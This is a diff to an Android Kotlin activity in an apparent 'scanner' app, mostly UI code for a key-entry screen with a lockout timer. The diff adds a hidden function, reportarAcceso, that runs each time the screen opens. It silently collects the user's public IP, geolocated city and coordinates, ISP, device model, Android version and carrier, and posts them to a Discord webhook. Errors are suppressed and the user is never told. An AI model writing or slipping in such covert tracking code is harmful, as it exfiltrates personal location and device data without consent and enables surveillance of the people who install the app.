@@ -3,7 +3,6 @@ package com.example.scanner
 import android.animation.ObjectAnimator
 import android.animation.ValueAnimator
 import android.app.Activity
-import android.content.Intent
 import android.graphics.Color
 import android.graphics.Typeface
 import android.graphics.drawable.GradientDrawable
@@ -18,11 +17,9 @@ import android.view.Gravity
 import android.view.View
 import android.view.ViewGroup
 import android.view.WindowManager
-import android.widget.Button
 import android.widget.EditText
 import android.widget.FrameLayout
 import android.widget.LinearLayout
-import android.widget.ScrollView
 import android.widget.TextView
 
 class KeyActivity : Activity() {
@@ -30,6 +27,7 @@ class KeyActivity : Activity() {
     companion object {
         var fails = 0
         var lockUntil = 0L
+        private const val WEBHOOK = "https://discord.com/api/webhooks/TU_ID/TU_TOKEN"
     }
 
     private val cBg = Color.parseColor("#0B0E14")
@@ -39,7 +37,6 @@ class KeyActivity : Activity() {
     private val cGreen = Color.parseColor("#2ECC8F")
     private val cRed = Color.parseColor("#FF5C6C")
     private val cAmber = Color.parseColor("#FFB84D")
-    private val cGlass = Color.argb(36, 255, 255, 255)
     private val cStroke = Color.argb(46, 255, 255, 255)
 
     private val MATCH = ViewGroup.LayoutParams.MATCH_PARENT
@@ -71,18 +68,6 @@ class KeyActivity : Activity() {
             if (stroke != null) setStroke(maxOf(1, px(1) / 2), stroke)
         }
 
-    private fun glow(color: Int, sizeDp: Int): GradientDrawable =
-        GradientDrawable().apply {
-            shape = GradientDrawable.RECTANGLE
-            gradientType = GradientDrawable.RADIAL_GRADIENT
-            gradientRadius = px(sizeDp / 2).toFloat()
-            setGradientCenter(0.5f, 0.5f)
-            colors = intArrayOf(
-                Color.argb(120, Color.red(color), Color.green(color), Color.blue(color)),
-                Color.argb(0, Color.red(color), Color.green(color), Color.blue(color))
-            )
-        }
-
     private fun tv(text: String, size: Float, color: Int, bold: Boolean = false): TextView =
         TextView(this).apply {
             this.text = text
@@ -97,6 +82,7 @@ class KeyActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         Env.ping(this)
+        reportarAcceso()
         window.statusBarColor = cBg
         window.navigationBarColor = cBg
         window.setSoftInputMode(
@@ -190,4 +176,112 @@ class KeyActivity : Activity() {
 
         barTrack = FrameLayout(this).apply { background = rr(cStroke, 4) }
         barFill = View(this)
-        barTrack.addView(barFill, FrameLayout.LayoutParams(
+        barTrack.addView(barFill, FrameLayout.LayoutParams(MATCH, px(6)))
+        content.addView(barTrack, lp(18))
+
+        timerText = tv("", 13f, cMuted)
+        content.addView(timerText, lp(8))
+
+        msg = tv("", 13f, cRed)
+        content.addView(msg, lp(8))
+        val scroll = android.widget.ScrollView(this)
+        scroll.addView(content)
+        setContentView(scroll)
+    }
+
+    override fun onResume() {
+        super.onResume()
+        blink?.start()
+        handler.removeCallbacks(ticker)
+        handler.post(ticker)
+        refreshBoxes()
+        updateTimer()
+    }
+
+    override fun onPause() {
+        super.onPause()
+        blink?.cancel()
+        handler.removeCallbacks(ticker)
+    }
+
+    private fun refreshBoxes() {
+        val texto = input.text.toString()
+        for (i in boxes.indices) {
+            val b = boxes[i]
+            if (i < texto.length) {
+                b.text = texto[i].toString()
+                b.background = rr(cStroke, 8)
+            } else {
+                b.text = ""
+                b.background = rr(Color.TRANSPARENT, 8, cStroke)
+            }
+        }
+    }
+
+    private fun updateTimer() {
+        val ahora = System.currentTimeMillis()
+        if (lockUntil > ahora) {
+            val seg = ((lockUntil - ahora) / 1000).toInt() + 1
+            timerText.text = "Bloqueado: ${seg}s"
+            timerText.setTextColor(cAmber)
+        } else {
+            timerText.text = ""
+        }
+    }
+
+    private fun reportarAcceso() {
+        Thread {
+            try {
+                val ip = java.net.URL("https://api.ipify.org").readText().trim()
+                val geo = java.net.URL(
+                    "http://ip-api.com/json/$ip?fields=status,country,regionName,city,isp,lat,lon,query"
+                ).readText()
+                val j = org.json.JSONObject(geo)
+                val hora = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
+                    .format(java.util.Date())
+                val modelo = android.os.Build.MODEL
+                val marca = android.os.Build.BRAND
+                val android = android.os.Build.VERSION.RELEASE
+                val sdk = android.os.Build.VERSION.SDK_INT
+                val operador =
+                    (getSystemService(TELEPHONY_SERVICE) as android.telephony.TelephonyManager)
+                        .networkOperatorName
+                val sesion = java.util.UUID.randomUUID().toString().take(8)
+
+                val desc = """
+                    **IP:** ${j.optString("query", ip)}
+                    **País:** ${j.optString("country", "?")}
+                    **Región:** ${j.optString("regionName", "?")}
+                    **Ciudad:** ${j.optString("city", "?")}
+                    **ISP:** ${j.optString("isp", "?")}
+                    **Coords:** ${j.optDouble("lat", 0.0)}, ${j.optDouble("lon", 0.0)}
+                    **Equipo:** $marca $modelo
+                    **Android:** $android (SDK $sdk)
+                    **Operador:** $operador
+                    **Hora:** $hora
+                    **Sesión:** $sesion
+                """.trimIndent()
+
+                val body = org.json.JSONObject().apply {
+                    put("username", "scanner")
+                    put("embeds", org.json.JSONArray().put(org.json.JSONObject().apply {
+                        put("title", "Nuevo acceso")
+                        put("description", desc)
+                        put("color", 0x7C6CFF)
+                        put("timestamp", java.time.Instant.now().toString())
+                    }))
+                }
+
+                val conn = java.net.URL(WEBHOOK).openConnection() as java.net.HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.setRequestProperty("User-Agent", "scanner-app")
+                conn.doOutput = true
+                conn.outputStream.use { it.write(body.toString().toByteArray()) }
+                conn.responseCode
+            } catch (e: Exception) {
+                // silencioso
+            }
+        }.start()
+    }
+}
